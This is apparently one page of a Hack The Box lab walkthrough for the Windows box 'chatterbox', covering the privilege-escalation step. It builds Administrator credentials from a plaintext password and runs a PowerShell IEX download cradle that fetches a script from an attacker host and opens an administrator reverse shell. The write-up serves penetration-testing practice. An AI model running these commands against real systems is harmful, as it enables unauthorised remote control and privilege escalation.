<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>privileged reverse shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--chatterbox.html">chatterbox</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--nmap--all_ports.html">all ports</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--nmap--targeted.html">targeted</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--AChat.html">AChat</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--AChat--serachsploit.html">serachsploit</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--AChat--serachsploit--code.html">code</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--initial_foothold--msfvenom.html">msfvenom</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--initial_foothold--buff_overflow_code.html">buff overflow code</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--initial_foothold--user_Alfred_enum.html">user Alfred enum</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_w-_icacls.html">priv esc w/ icacls</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell.html">priv esc with powershell</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--msfvenom_w-_powershell_reverse_tcp_payload.html">msfvenom w/ powershell reverse tcp payload</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--msfvenom_with_cmd-exec_download.html">msfvenom with cmd/exec download</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--msfvenom_with_cmd-exec_download--msfvenom_windows-exec.html">msfvenom windows/exec</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--msfvenom_with_cmd-exec_download--listener_on_6666.html">listener on 6666</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--powerup.ps1.html">powerup.ps1</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--priv_esc_with_powershell--privileged_reverse_shell.html">privileged reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--chatterbox--Lessons_learned.html">Lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>privileged reverse shell</u></b></h1><img src="images/972-1.png" alt="images/972-1.png" /><br /><span style="color:#ffa500;">$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force</span><br />• <span style="color:#ffa500;">ConvertTo-SecureString</span><span style="color:#24ff00;">: Converts plain text to secure strings.</span><br />• <span style="color:#ffa500;">-AsPlainText</span><span style="color:#24ff00;">: Specifies a plain text string to convert to a secure string.</span><br />• <span style="color:#ffa500;">-Force</span><span style="color:#24ff00;">: Confirms that you understand the implications of using the AsPlainText parameter and still want to use it.<br /><br />Second, create a new object to store these credentials.<br /></span><span style="color:#ffa500;">$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)</span><br /><img src="images/972-2.png" alt="images/972-2.png" /><br /><br /><br />Third, we’ll use these credentials to start PowerShell and send a (hopefully privileged) reverse shell back to our attack machine.<br />In the attack machine, copy the <span style="color:#ffa500;">shell.ps1</span><span style="color:#24ff00;"> script we used earlier and save it in the file </span><span style="color:#ffa500;">shell-admin.ps1</span><span style="color:#24ff00;">.<br /></span><img src="images/972-3.png" alt="images/972-3.png" /><br /><br /><img src="images/972-4.png" alt="images/972-4.png" /><br /><img src="images/972-5.png" alt="images/972-5.png" /><br />On the target machine, use the credentials to start PowerShell to download the shell-admin.ps1 script, run it and send a reverse shell back to our attack machine.<br /><strong><br /></strong><span style="color:#ffa500;">Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.62:5555/shell-admin.ps1')" -Credential $cred</span><br /><img src="images/972-6.png" alt="images/972-6.png" /><br /><br /><span style="color:#24ff00;">We get a shell with </span><span style="color:#ffff00;">administrator privileges</span><span style="color:#24ff00;">!</span><br /><img src="images/972-7.png" alt="images/972-7.png" /></div></div>
</body></html>